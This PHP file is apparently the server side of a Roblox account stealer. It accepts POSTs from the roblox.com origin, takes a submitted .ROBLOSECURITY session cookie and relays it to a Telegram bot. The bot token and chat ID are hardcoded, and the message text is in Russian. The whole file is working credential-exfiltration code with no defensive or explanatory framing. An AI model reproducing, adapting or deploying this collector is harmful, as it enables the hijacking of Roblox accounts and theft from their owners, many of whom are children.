<?php

header("Access-Control-Allow-Origin: https://www.roblox.com");

header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!isset($data['cookie'])) {
    http_response_code(400);
    die('Noc');
}

$cookie = htmlspecialchars($data['cookie'], ENT_QUOTES);

$botToken = "5678022703:AAFiYQZFBP_7ICzXvhfZFAvLJFz_yU8YZOY";
$chatId = "554476336";

$message = " Новая кука .ROBLOSECURITY:\n<code>" . $cookie . "</code>";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postFields = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);

if ($response === false) {
    http_response_code(500);
    die('t');
}

curl_close($ch);

echo 'ok';

?>
